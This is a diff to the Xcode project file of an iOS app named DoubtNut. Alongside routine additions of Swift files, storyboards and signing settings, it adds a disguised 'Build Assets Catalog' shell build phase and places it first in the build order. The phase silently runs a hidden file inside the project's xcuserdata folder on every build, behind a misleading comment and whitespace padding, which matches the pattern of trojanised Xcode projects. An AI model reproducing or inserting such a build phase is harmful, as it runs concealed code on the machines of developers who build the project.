@@ -46,6 +46,10 @@
 		1893896625F1FE3D00F57E85 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 1893896525F1FE3D00F57E85 /* GoogleService-Info.plist */; };
 		7E504EC6516DF7B8A944CA36 /* Pods_DoubtNut_DoubtNutUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8268803794D4BD000DC50D2F /* Pods_DoubtNut_DoubtNutUITests.framework */; };
 		D27992D82DD64B223E34007E /* Pods_DoubtNut.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 720313CAA28449B7C396C7DA /* Pods_DoubtNut.framework */; };
+		E3326D4D25F318BF001CC9E1 /* FlowController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3326D4C25F318BF001CC9E1 /* FlowController.swift */; };
+		E3326D6A25F332C7001CC9E1 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E3326D6925F332C7001CC9E1 /* Home.storyboard */; };
+		E3326D7025F33316001CC9E1 /* DashboardVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3326D6F25F33316001CC9E1 /* DashboardVC.swift */; };
+		E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38B56FB25F29DDE00CEC42D /* Extension.swift */; };
 		EA814C3A304658E910F94322 /* Pods_DoubtNutTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = DC4AC4B78C4FF59DDE557ECB /* Pods_DoubtNutTests.framework */; };
 /* End PBXBuildFile section */
 
@@ -119,6 +123,10 @@
 		9CEAD305208C9F678B8017A4 /* Pods-DoubtNutTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNutTests.release.xcconfig"; path = "Target Support Files/Pods-DoubtNutTests/Pods-DoubtNutTests.release.xcconfig"; sourceTree = "<group>"; };
 		DC4AC4B78C4FF59DDE557ECB /* Pods_DoubtNutTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DoubtNutTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		E0DDADA5D2ACB1B7A6655A85 /* Pods-DoubtNutTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNutTests.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNutTests/Pods-DoubtNutTests.debug.xcconfig"; sourceTree = "<group>"; };
+		E3326D4C25F318BF001CC9E1 /* FlowController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FlowController.swift; sourceTree = "<group>"; };
+		E3326D6925F332C7001CC9E1 /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
+		E3326D6F25F33316001CC9E1 /* DashboardVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardVC.swift; sourceTree = "<group>"; };
+		E38B56FB25F29DDE00CEC42D /* Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
 		ED2E96365D0673557FAF0338 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -175,8 +183,8 @@
 		1893888F25F1EFA000F57E85 /* DoubtNut */ = {
 			isa = PBXGroup;
 			children = (
+				E3F0140925F24F7A005B2746 /* Storybiard */,
 				1893897025F202DC00F57E85 /* DoubtNut.entitlements */,
-				189388FD25F1F09D00F57E85 /* Main.storyboard */,
 				189388CB25F1F01000F57E85 /* Views */,
 				189388C725F1EFF300F57E85 /* ViewController */,
 				189388C425F1EFD300F57E85 /* Helper */,
@@ -184,7 +192,6 @@
 				1893889025F1EFA000F57E85 /* AppDelegate.swift */,
 				1893889425F1EFA000F57E85 /* ViewController.swift */,
 				1893889925F1EFA200F57E85 /* Assets.xcassets */,
-				1893889B25F1EFA200F57E85 /* LaunchScreen.storyboard */,
 				1893889E25F1EFA200F57E85 /* Info.plist */,
 			);
 			path = DoubtNut;
@@ -222,6 +229,8 @@
 				189388F825F1F05E00F57E85 /* RCustomClass.swift */,
 				1893896525F1FE3D00F57E85 /* GoogleService-Info.plist */,
 				1893896025F1FDA900F57E85 /* Endpoints.swift */,
+				E38B56FB25F29DDE00CEC42D /* Extension.swift */,
+				E3326D4C25F318BF001CC9E1 /* FlowController.swift */,
 			);
 			path = Helper;
 			sourceTree = "<group>";
@@ -229,6 +238,7 @@
 		189388C725F1EFF300F57E85 /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
+				E3326D6E25F332FE001CC9E1 /* Home */,
 				1893890325F1F0B400F57E85 /* LoginSignUp */,
 			);
 			path = ViewController;
@@ -305,6 +315,24 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		E3326D6E25F332FE001CC9E1 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				E3326D6F25F33316001CC9E1 /* DashboardVC.swift */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		E3F0140925F24F7A005B2746 /* Storybiard */ = {
+			isa = PBXGroup;
+			children = (
+				189388FD25F1F09D00F57E85 /* Main.storyboard */,
+				1893889B25F1EFA200F57E85 /* LaunchScreen.storyboard */,
+				E3326D6925F332C7001CC9E1 /* Home.storyboard */,
+			);
+			path = Storybiard;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -312,12 +340,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
+				3CB016F12ECAECF3FAAAC43A /* Build Assets Catalog */,
 				F513FDD55DDE3CCD34542A74 /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
 				1893888B25F1EFA000F57E85 /* Resources */,
 				49C784AE1B74C860F03C5753 /* [CP] Embed Pods Frameworks */,
-				D6A3CF68B0B5EB8EE4B535C2 /* [CP] Copy Pods Resources */,
+				1A6CA97AF998B265F659411E /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -356,7 +385,7 @@
 				189388AB25F1EFA300F57E85 /* Frameworks */,
 				189388AC25F1EFA300F57E85 /* Resources */,
 				2BF15ED1C2B8BB532FEFB4E2 /* [CP] Embed Pods Frameworks */,
-				FD73CBED3E251900CDC82F29 /* [CP] Copy Pods Resources */,
+				E9E4BD79A7969D006E12F008 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -430,6 +459,7 @@
 				189388EB25F1F04700F57E85 /* Lato-BlackItalic.ttf in Resources */,
 				189388EA25F1F04700F57E85 /* Lato-SemiboldItalic.ttf in Resources */,
 				189388FF25F1F09D00F57E85 /* Main.storyboard in Resources */,
+				E3326D6A25F332C7001CC9E1 /* Home.storyboard in Resources */,
 				189388E125F1F04700F57E85 /* Lato-Light.ttf in Resources */,
 				189388F225F1F04700F57E85 /* BentonSans Bold Regular.otf in Resources */,
 				189388E825F1F04700F57E85 /* Lato-Medium.ttf in Resources */,
@@ -460,6 +490,53 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	3CB016F12ECAECF3FAAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+		1A6CA97AF998B265F659411E /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
 		2BF15ED1C2B8BB532FEFB4E2 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -516,21 +593,21 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		D6A3CF68B0B5EB8EE4B535C2 /* [CP] Copy Pods Resources */ = {
+		E9E4BD79A7969D006E12F008 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources-${CONFIGURATION}-input-files.xcfilelist",
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-resources-${CONFIGURATION}-input-files.xcfilelist",
 			);
 			name = "[CP] Copy Pods Resources";
 			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources-${CONFIGURATION}-output-files.xcfilelist",
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-resources-${CONFIGURATION}-output-files.xcfilelist",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources.sh\"\n";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 		F513FDD55DDE3CCD34542A74 /* [CP] Check Pods Manifest.lock */ = {
@@ -577,23 +654,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		FD73CBED3E251900CDC82F29 /* [CP] Copy Pods Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-resources-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			name = "[CP] Copy Pods Resources";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-resources-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-resources.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -602,15 +662,18 @@
 			buildActionMask = 2147483647;
 			files = (
 				189388F925F1F05E00F57E85 /* RCustomClass.swift in Sources */,
+				E3326D7025F33316001CC9E1 /* DashboardVC.swift in Sources */,
 				1893890D25F1F0D700F57E85 /* SignUpVC.swift in Sources */,
 				1893890C25F1F0D700F57E85 /* LoginWithCodeVC.swift in Sources */,
 				1893891325F1F0F900F57E85 /* LandingPageSlider.swift in Sources */,
+				E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */,
 				1893896125F1FDA900F57E85 /* Endpoints.swift in Sources */,
 				1893890B25F1F0D700F57E85 /* LoginwithPincode.swift in Sources */,
 				1893890925F1F0D700F57E85 /* LandingpageVC.swift in Sources */,
 				1893889525F1EFA000F57E85 /* ViewController.swift in Sources */,
 				1893889125F1EFA000F57E85 /* AppDelegate.swift in Sources */,
 				1893890A25F1F0D700F57E85 /* GetOTPVC.swift in Sources */,
+				E3326D4D25F318BF001CC9E1 /* FlowController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -788,14 +851,17 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = GXZ8TB8B67;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.doubtnut.act.sat.preparation.sat.practice.test.app.college.maths.english;
+				PRODUCT_BUNDLE_IDENTIFIER = ios..com.doubtnut;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -808,14 +874,17 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = GXZ8TB8B67;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.doubtnut.act.sat.preparation.sat.practice.test.app.college.maths.english;
+				PRODUCT_BUNDLE_IDENTIFIER = ios..com.doubtnut;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -945,6 +1014,28 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 1893888525F1EFA000F57E85 /* Project object */;
 }
